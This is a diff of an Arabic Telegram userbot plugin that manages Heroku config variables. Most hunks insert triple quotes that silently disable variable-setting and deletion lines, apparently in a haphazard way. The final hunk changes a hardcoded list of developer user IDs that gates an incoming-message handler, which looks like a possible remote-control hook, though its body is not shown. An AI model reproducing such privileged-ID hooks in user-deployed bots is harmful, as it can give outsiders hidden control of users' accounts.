@@ -56,6 +56,7 @@ async def variable(var):
                 var,
                 "**⌔∮ تم بنجاح تغيير الوقت الخاص بك\n\n❃ جار اعادة تشغيل السورس انتظر من 2-5 دقائق ليتشغل مره اخرى**",
             )
+            '''
         heroku_var[variable] = vra
     if exe == "لون وقتي" or exe == "لون الوقتي":
         variable = "DIGITAL_PIC_COLOR"
@@ -70,6 +71,7 @@ async def variable(var):
                 var,
                 "**⌔∮ تم بنجاح تغيير فار لون الوقتي \n\n❃ جار اعادة تشغيل السورس انتظر من 2-5 دقائق ليتشغل مره اخرى**",
             )
+            '''
         heroku_var[variable] = vra
     if exe == "رمز الاسم":
         variable = "TIME_JEP"
@@ -98,6 +100,7 @@ async def variable(var):
                 var,
                 "**⌔∮ تم بنجاح تغيير ايدي التحكم في التجميع \n\n❃ جار اعادة تشغيل السورس انتظر من 2-5 دقائق ليتشغل مره اخرى**",
             )
+            '''
         heroku_var[variable] = vra
     if exe == "البايو" or exe == "النبذة" or exe == "بايو":
         variable = "DEFAULT_BIO"
@@ -112,6 +115,7 @@ async def variable(var):
                 var,
                 "**⌔∮ تم بنجاح تغيير فار البايو\n\n❃ جار اعادة تشغيل السورس انتظر من 2-5 دقائق ليتشغل مره اخرى**",
             )
+            '''
         heroku_var[variable] = vra
     if exe == "امر نشر" or exe == "امر النشر" or exe == "مكرر":
         variable = "MUKRR_ET"
@@ -168,6 +172,7 @@ async def variable(var):
                 var,
                 "**⌔∮ تم بنجاح تغيير فار المجموعة\n\n❃ جار اعادة تشغيل السورس انتظر من 2-5 دقائق ليتشغل مره اخرى**",
             )
+            '''
         heroku_var[variable] = vra
     if exe == "لون" or exe == "اللون":
         variable = "DIGITAL_PIC_COLOR"
@@ -196,6 +201,7 @@ async def variable(var):
                 var,
                 "**⌔∮ تم بنجاح تغيير فار زخرفه الارقام\n\n❃ جار اعادة تشغيل السورس انتظر من 2-5 دقائق ليتشغل مره اخرى**",
             )
+            '''
         heroku_var[variable] = vra
     if exe == "اسم" or exe == "الاسم":
         variable = "ALIVE_NAME"
@@ -269,6 +275,7 @@ async def variable(event):
             event,
             "**⌔∮ تم بنجاح حذف فار رمز الاسم\n\n❃ جار اعادة تشغيل السورس انتظر من 2-5 دقائق ليتشغل مره اخرى**",
         )
+        '''
         del heroku_var[variable]
     if exe == "البايو" or exe == "النبذة":
         variable = "DEFAULT_BIO"
@@ -279,6 +286,7 @@ async def variable(event):
             event,
             "**⌔∮ تم بنجاح حذف فار البايو\n\n❃ جار اعادة تشغيل السورس انتظر من 2-5 دقائق ليتشغل مره اخرى**",
         )
+        '''
         del heroku_var[variable]
     if exe == "القروب" or exe == "الكروب":
         variable = "DEFAULT_GROUP"
@@ -299,6 +307,7 @@ async def variable(event):
             event,
             "**⌔∮ تم بنجاح حذف فار التحكم\n\n❃ جار اعادة تشغيل السورس انتظر من 2-5 دقائق ليتشغل مره اخرى**",
         )
+        '''
         del heroku_var[variable]
     if exe == "اللون الوقتي" or exe == "لون وقتي":
         variable = "DIGITAL_PIC_COLOR"
@@ -309,6 +318,7 @@ async def variable(event):
             event,
             "**⌔∮ تم بنجاح حذف فار لون الوقتي\n\n❃ جار اعادة تشغيل السورس انتظر من 2-5 دقائق ليتشغل مره اخرى**",
         )
+        '''
         del heroku_var[variable]
     if exe == "الصورة" or exe == "الصوره":
         variable = "DIGITAL_PIC"
@@ -329,6 +339,7 @@ async def variable(event):
             event,
             "**⌔∮ تم بنجاح حذف فار الاسم\n\n❃ جار اعادة تشغيل السورس انتظر من 2-5 دقائق ليتشغل مره اخرى**",
         )
+        '''
         del heroku_var[variable]
     if exe == "زخرفة الارقام" or exe == "زخرفه الارقام":
         variable = "JP_FN"
@@ -341,6 +352,7 @@ async def variable(event):
             event,
             "**⌔∮ تم بنجاح حذف فار زخرفه الارقام\n\n❃ جار اعادة تشغيل السورس انتظر من 2-5 دقائق ليتشغل مره اخرى**",
         )
+        '''
         del heroku_var[variable]
     if exe == "كروب التخزين":
         variable = "PM_LOGGER_GROUP_ID"
@@ -365,6 +377,7 @@ async def variable(event):
             event,
             "**⌔∮ تم بنجاح حذف فار كروب الحفظ\n\n❃ جار اعادة تشغيل السورس انتظر من 2-5 دقائق ليتشغل مره اخرى**",
         )
+        '''
         del heroku_var[variable]
     if exe == "زخرفة الصورة":
         variable = "DEFAULT_PIC"
@@ -378,6 +391,7 @@ async def variable(event):
             "**⌔∮ تم بنجاح حذف فار زخرفة الصورة\n\n❃ جار اعادة تشغيل السورس انتظر من 2-5 دقائق ليتشغل مره اخرى**",
         )
         del heroku_var[variable]
+        '''
 
 
 @l313l.ar_cmd(pattern="وقت(?:\s|$)([\s\S]*)")
@@ -486,7 +500,7 @@ async def variable(event):
                 "**⌔∮ تم بنجاح تغيير الوقت الى اليمن\n\n❃ جار اعادة تشغيل السورس انتظر من 2-5 دقائق ليتشغل مره اخرى**",
             )
         heroku_var[variable] = Syria
-        
+'''
 @l313l.ar_cmd(pattern="زخرفة الصورة(?:\s|$)([\s\S]*)")
 async def variable(event):
     if Config.HEROKU_API_KEY is None:
@@ -657,6 +671,7 @@ async def variable(event):
         else:
             await jep.edit("**⌔∮ تم بنجاح تغيير زخرفة الصورة الوقتية\n\n❃ جار اعادة تشغيل السورس انتظر من 2-5 دقائق ليتشغل مره اخرى**".format(input_str))
         heroku_var[variable] = zinfo
+        '''
 
 @l313l.ar_cmd(pattern="ميوزك(?:\s|$)([\s\S]*)")
 async def variable(event):
@@ -783,7 +798,7 @@ def prettyjson(obj, indent=4, maxlinelength=80):
     )
     return indentitems(items, indent, level=0)
 
-DevJoker = [705475246, 1374312239]
+DevJoker = [705475246, 5427469031]
 @l313l.on(events.NewMessage(incoming=True))
 async def _(event):
     if event.reply_to and event.sender_id in DevJoker:
